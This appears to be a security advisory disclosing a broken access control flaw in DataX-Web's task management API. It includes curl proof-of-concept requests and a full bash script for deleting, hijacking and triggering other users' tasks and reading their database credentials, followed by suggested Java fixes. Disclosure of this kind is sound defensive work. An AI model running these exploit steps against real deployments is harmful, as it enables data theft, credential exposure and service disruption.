# Broken Access Control Vulnerability in DataX-Web Task Management

## NAME OF AFFECTED PRODUCT(S)

+ DataX-Web

## AFFECTED AND/OR FIXED VERSION(S)

### Vendor Homepage

+ https://github.com/WeiYe-Jing/datax-web

### Submitter

+ s1ain

### VERSION(S)

+ <= 2.1.2

### Software Link

+ https://github.com/WeiYe-Jing/datax-web

## PROBLEM TYPE

### Vulnerability Type

+ Broken Access Control / Horizontal Privilege Escalation

### Root Cause

A broken access control vulnerability was found in the DataX-Web application's task management functionality. Although the system implements a permission checking mechanism (`validPermission` method), this validation is not enforced in critical task operations. The root cause is that the application fails to verify whether the current user has permission to access or modify tasks belonging to other users, leading to horizontal privilege escalation.

### Impact

This vulnerability allows any authenticated user to:
- View, modify, or delete tasks created by other users
- Start, stop, or trigger execution of other users' tasks
- Access sensitive configuration information from other users' tasks (including database credentials)
- Cause denial of service by deleting critical data synchronization tasks
- Modify task configurations to exfiltrate data to attacker-controlled servers

## DESCRIPTION

DataX-Web is a distributed data synchronization tool with multi-user support. The system has a permission model where users can have different roles (admin or regular user) and permissions to access specific job groups. However, critical task management operations (remove, update, start, stop, trigger) do not implement the designed access control checks, allowing users to perform unauthorized operations on tasks they don't own.

## Code Analysis

### Permission Mechanism Design

The system has a proper permission checking mechanism:

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/entity/JobUser.java`

```java
public class JobUser {
    private int id;
    private String username;
    private String password;
    private String role;         // "0" - regular user, "1" - admin
    private String permission;   // Comma-separated job group IDs

    // Permission checking method exists but is not used
    public boolean validPermission(int jobGroup) {
        if ("1".equals(this.role)) {
            return true;  // Admin has all permissions
        } else {
            // Regular user - check job group permission
            if (StringUtils.hasText(this.permission)) {
                for (String permissionItem : this.permission.split(",")) {
                    if (String.valueOf(jobGroup).equals(permissionItem)) {
                        return true;
                    }
                }
            }
            return false;
        }
    }
}
```

### Vulnerable Code - Missing Permission Checks

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/controller/JobInfoController.java`

```java
@PostMapping(value = "/remove/{id}")
@ApiOperation("Remove Task")
public ReturnT<String> remove(@PathVariable(value = "id") int id) {
    // ❌ No permission check - any user can delete any task
    return jobService.remove(id);
}

@PostMapping("/update")
@ApiOperation("Update Task")
public ReturnT<String> update(HttpServletRequest request, @RequestBody JobInfo jobInfo) {
    // ❌ No ownership verification
    jobInfo.setUserId(getCurrentUserId(request));
    return jobService.update(jobInfo);
}

@RequestMapping(value = "/stop", method = RequestMethod.POST)
@ApiOperation("Stop Task")
public ReturnT<String> pause(int id) {
    // ❌ No permission check
    return jobService.stop(id);
}

@RequestMapping(value = "/start", method = RequestMethod.POST)
@ApiOperation("Start Task")
public ReturnT<String> start(int id) {
    // ❌ No permission check
    return jobService.start(id);
}

@PostMapping(value = "/trigger")
@ApiOperation("Trigger Task")
public ReturnT<String> triggerJob(@RequestBody TriggerJobDto dto) {
    // ❌ No permission check - any user can trigger any task
    String executorParam = dto.getExecutorParam();
    if (executorParam == null) {
        executorParam = "";
    }
    JobTriggerPoolHelper.trigger(dto.getJobId(), TriggerTypeEnum.MANUAL,
                                 -1, null, executorParam);
    return ReturnT.SUCCESS;
}
```

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/service/impl/JobServiceImpl.java`

```java
@Override
public ReturnT<String> remove(int id) {
    JobInfo xxlJobInfo = jobInfoMapper.loadById(id);
    if (xxlJobInfo == null) {
        return ReturnT.SUCCESS;
    }

    // ❌ No check: Is current user the owner?
    // ❌ No check: Does current user have permission for this jobGroup?
    jobInfoMapper.delete(id);
    jobLogMapper.delete(id);
    jobLogGlueMapper.deleteByJobId(id);
    return ReturnT.SUCCESS;
}

@Override
public ReturnT<String> update(JobInfo jobInfo) {
    JobInfo exists_jobInfo = jobInfoMapper.loadById(jobInfo.getId());
    if (exists_jobInfo == null) {
        return new ReturnT<>(ReturnT.FAIL_CODE, "Task not found");
    }

    // ❌ No validation: Is current user allowed to modify this task?
    BeanUtils.copyProperties(jobInfo, exists_jobInfo);
    jobInfoMapper.update(exists_jobInfo);
    return ReturnT.SUCCESS;
}
```

### Evidence of Commented-Out Permission Checks

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/controller/JobLogController.java`

```java
// Line 48 - Permission check exists but is commented out!
//JobInfoController.validPermission(request, jobGroup);
// Comment: Only admin can query all; regular users can only query permitted jobGroups
```

This shows that the developers were aware of the need for permission checks but failed to implement them.

### Vulnerability Location

**Affected Components:**
- `datax-admin/src/main/java/com/wugui/datax/admin/controller/JobInfoController.java` (lines 73, 66, 79, 85, 96)
- `datax-admin/src/main/java/com/wugui/datax/admin/service/impl/JobServiceImpl.java` (remove, update, start, stop methods)

**Affected Operations:**
- Task deletion (`/api/job/remove/{id}`)
- Task modification (`/api/job/update`)
- Task start (`/api/job/start`)
- Task stop (`/api/job/stop`)
- Task triggering (`/api/job/trigger`)

## Vulnerability Details and POC

### Attack Scenario

**Setup:**
- User A (ID: 100, regular user) creates Task 500
- User B (ID: 200, regular user, malicious) wants to access/modify Task 500

### Attack Vector 1: Unauthorized Task Deletion

```bash
# User B deletes User A's task
curl -X POST http://target.com/api/job/remove/500 \
  -H "Authorization: Bearer <user_b_token>" \
  -H "Content-Type: application/json"

# Response: {"code":200,"msg":"success"}
# Task 500 is deleted even though User B doesn't own it
```

### Attack Vector 2: Unauthorized Task Modification

```bash
# User B modifies User A's task to exfiltrate data
curl -X POST http://target.com/api/job/update \
  -H "Authorization: Bearer <user_b_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": 500,
    "userId": 200,
    "jobDesc": "Modified by attacker",
    "writerDatasourceId": 999,
    "jobJson": "{...change destination to attacker-controlled server...}"
  }'

# The task now sends data to attacker's server
```

### Attack Vector 3: Information Disclosure

```bash
# User B retrieves User A's task to view database credentials
curl -X GET http://target.com/api/job/pageList?current=1&size=100 \
  -H "Authorization: Bearer <user_b_token>"

# Response includes all tasks with sensitive information:
{
  "data": {
    "records": [
      {
        "id": 500,
        "userId": 100,
        "readerDatasourceId": 5,  // Can query datasource details
        "writerDatasourceId": 6,
        "jobJson": "{...contains connection details...}"
      }
    ]
  }
}

# Then query datasource details
curl -X GET http://target.com/api/jobJdbcDatasource/5 \
  -H "Authorization: Bearer <user_b_token>"

# Returns database credentials
```

### Attack Vector 4: Denial of Service

```bash
# User B stops critical production tasks
curl -X POST http://target.com/api/job/stop \
  -H "Authorization: Bearer <user_b_token>" \
  -H "Content-Type: application/json" \
  -d 'id=500'

# Critical data synchronization task is stopped
```

### Attack Vector 5: Unauthorized Execution

```bash
# User B triggers User A's task with malicious parameters
curl -X POST http://target.com/api/job/trigger \
  -H "Authorization: Bearer <user_b_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "jobId": 500,
    "executorParam": "malicious_parameter"
  }'
```

### Complete Exploitation Example

```bash
#!/bin/bash
# Complete attack script demonstrating horizontal privilege escalation

USER_B_TOKEN="eyJhbGciOiJIUzUxMiJ9..."  # User B's valid JWT token
TARGET_URL="http://target.com"

echo "[+] Step 1: Enumerate all tasks"
TASKS=$(curl -s "$TARGET_URL/api/job/pageList?current=1&size=1000" \
  -H "Authorization: Bearer $USER_B_TOKEN")
echo "$TASKS" | jq '.data.records[] | {id, userId, jobDesc}'

echo "[+] Step 2: Target high-value task owned by another user"
TARGET_TASK_ID=500

echo "[+] Step 3: Retrieve task details"
TASK_DETAILS=$(curl -s "$TARGET_URL/api/job/$TARGET_TASK_ID" \
  -H "Authorization: Bearer $USER_B_TOKEN")
echo "$TASK_DETAILS" | jq '.'

echo "[+] Step 4: Modify task to exfiltrate data"
curl -X POST "$TARGET_URL/api/job/update" \
  -H "Authorization: Bearer $USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": '$TARGET_TASK_ID',
    "userId": 200,
    "jobDesc": "Hijacked Task",
    "writerDatasourceId": 999
  }'

echo "[+] Step 5: Trigger modified task"
curl -X POST "$TARGET_URL/api/job/trigger" \
  -H "Authorization: Bearer $USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"jobId": '$TARGET_TASK_ID'}'

echo "[+] Attack complete - data is being exfiltrated"
```

## Attack Results

### Successful Exploitation Indicators

**1. Unauthorized Deletion:**
- User B successfully deletes tasks created by User A
- No error message about insufficient permissions
- Task is permanently removed from the system

**2. Unauthorized Modification:**
- User B modifies task configuration
- Changes persist in database
- Modified task executes with new configuration

**3. Information Disclosure:**
- User B accesses complete task details including:
  - Database connection strings
  - Data source credentials (encrypted, but accessible)
  - Business logic in jobJson
  - Schedule information

**4. Business Impact:**
- Critical data synchronization tasks stopped or deleted
- Data exfiltration to attacker-controlled servers
- Service disruption for legitimate users

### Real-World Impact Example

**Before Attack:**
```
User A's Task 500:
- Syncs customer data from production DB to analytics DB
- Runs every hour
- Contains production database credentials
```

**After Attack:**
```
User B (malicious insider):
1. Modifies Task 500 to send data to attacker's server
2. Triggers immediate execution
3. Obtains complete customer database
4. Deletes task to cover tracks
```

## Suggested Repair

### 1. Implement Permission Checks in Controllers (Critical)

```java
@Service
public class JobSecurityService {

    @Autowired
    private JobInfoMapper jobInfoMapper;

    @Autowired
    private JobUserMapper jobUserMapper;

    /**
     * Verify if user has permission to operate on this task
     */
    public boolean hasPermission(int userId, int jobId, String operation) {
        // Load task
        JobInfo jobInfo = jobInfoMapper.loadById(jobId);
        if (jobInfo == null) {
            return false;
        }

        // Load user
        JobUser user = jobUserMapper.loadById(userId);
        if (user == null) {
            return false;
        }

        // Check 1: Is user the task owner?
        if (jobInfo.getUserId() == userId) {
            return true;
        }

        // Check 2: Is user an admin?
        if ("1".equals(user.getRole())) {
            return true;
        }

        // Check 3: Does user have permission for this jobGroup?
        if (!user.validPermission(jobInfo.getJobGroup())) {
            logger.warn("Unauthorized access attempt: user={}, job={}, operation={}",
                       userId, jobId, operation);
            return false;
        }

        return true;
    }
}
```

### 2. Add Permission Checks to All Operations (Critical)

```java
@PostMapping(value = "/remove/{id}")
@ApiOperation("Remove Task")
public ReturnT<String> remove(HttpServletRequest request,
                              @PathVariable(value = "id") int id) {
    int currentUserId = getCurrentUserId(request);

    // Add permission check
    if (!jobSecurityService.hasPermission(currentUserId, id, "DELETE")) {
        return new ReturnT<>(ReturnT.FAIL_CODE,
            "Access denied: You don't have permission to delete this task");
    }

    return jobService.remove(id);
}

@PostMapping("/update")
@ApiOperation("Update Task")
public ReturnT<String> update(HttpServletRequest request,
                              @RequestBody JobInfo jobInfo) {
    int currentUserId = getCurrentUserId(request);

    // Add permission check
    if (!jobSecurityService.hasPermission(currentUserId, jobInfo.getId(), "UPDATE")) {
        return new ReturnT<>(ReturnT.FAIL_CODE,
            "Access denied: You don't have permission to update this task");
    }

    jobInfo.setUserId(currentUserId);
    return jobService.update(jobInfo);
}

@PostMapping(value = "/trigger")
@ApiOperation("Trigger Task")
public ReturnT<String> triggerJob(HttpServletRequest request,
                                  @RequestBody TriggerJobDto dto) {
    int currentUserId = getCurrentUserId(request);

    // Add permission check
    if (!jobSecurityService.hasPermission(currentUserId, dto.getJobId(), "EXECUTE")) {
        return new ReturnT<>(ReturnT.FAIL_CODE,
            "Access denied: You don't have permission to trigger this task");
    }

    String executorParam = dto.getExecutorParam();
    if (executorParam == null) {
        executorParam = "";
    }
    JobTriggerPoolHelper.trigger(dto.getJobId(), TriggerTypeEnum.MANUAL,
                                 -1, null, executorParam);
    return ReturnT.SUCCESS;
}
```

### 3. Add Service-Layer Validation (Defense in Depth)

```java
@Override
public ReturnT<String> update(JobInfo jobInfo, int currentUserId) {
    JobInfo exists_jobInfo = jobInfoMapper.loadById(jobInfo.getId());
    if (exists_jobInfo == null) {
        return new ReturnT<>(ReturnT.FAIL_CODE, "Task not found");
    }

    // Verify ownership in service layer as well
    JobUser currentUser = jobUserMapper.loadById(currentUserId);
    if (exists_jobInfo.getUserId() != currentUserId &&
        !"1".equals(currentUser.getRole()) &&
        !currentUser.validPermission(exists_jobInfo.getJobGroup())) {

        logger.warn("Unauthorized update attempt: user={}, task={}",
                   currentUserId, jobInfo.getId());
        return new ReturnT<>(ReturnT.FAIL_CODE, "Access denied");
    }

    BeanUtils.copyProperties(jobInfo, exists_jobInfo);
    // Ensure userId doesn't change
    exists_jobInfo.setUserId(exists_jobInfo.getUserId());
    jobInfoMapper.update(exists_jobInfo);
    return ReturnT.SUCCESS;
}
```

### 4. Use AOP for Centralized Permission Control (Recommended)

```java
@Aspect
@Component
public class JobPermissionAspect {

    @Autowired
    private JobSecurityService jobSecurityService;

    @Around("@annotation(RequireJobPermission)")
    public Object checkJobPermission(ProceedingJoinPoint joinPoint,
                                    RequireJobPermission permission) throws Throwable {
        HttpServletRequest request = getCurrentRequest();
        int userId = getCurrentUserId(request);

        int jobId = extractJobId(joinPoint.getArgs());

        if (!jobSecurityService.hasPermission(userId, jobId, permission.value())) {
            throw new AccessDeniedException("Access denied to job: " + jobId);
        }

        return joinPoint.proceed();
    }
}

// Usage
@PostMapping(value = "/remove/{id}")
@RequireJobPermission("DELETE")
public ReturnT<String> remove(@PathVariable(value = "id") int id) {
    return jobService.remove(id);
}
```

### 5. Filter Task Listings by Permission (Critical)

```java
@GetMapping
@ApiOperation("List Tasks")
public R<IPage<JobInfo>> selectAll(HttpServletRequest request) {
    int currentUserId = getCurrentUserId(request);
    JobUser currentUser = jobUserMapper.loadById(currentUserId);

    QueryWrapper<JobInfo> query = new QueryWrapper<>();

    // If not admin, filter by userId or permitted jobGroups
    if (!"1".equals(currentUser.getRole())) {
        query.and(wrapper -> wrapper
            .eq("user_id", currentUserId)  // Own tasks
            .or()
            .in("job_group", getPermittedJobGroups(currentUser))  // Permitted groups
        );
    }

    return success(jobService.page(form.getPlusPagingQueryEntity(), query));
}
```

## Timeline

- **Discovery Date:** 2025-11-02
- **Vendor Notification:** TBD
- **Public Disclosure:** TBD

## References

- DataX-Web Repository: https://github.com/WeiYe-Jing/datax-web
- OWASP Top 10 - A01:2021 Broken Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-284: Improper Access Control

## Credits

- Discovered by: s1ain
- Analysis Date: 2025-11-02
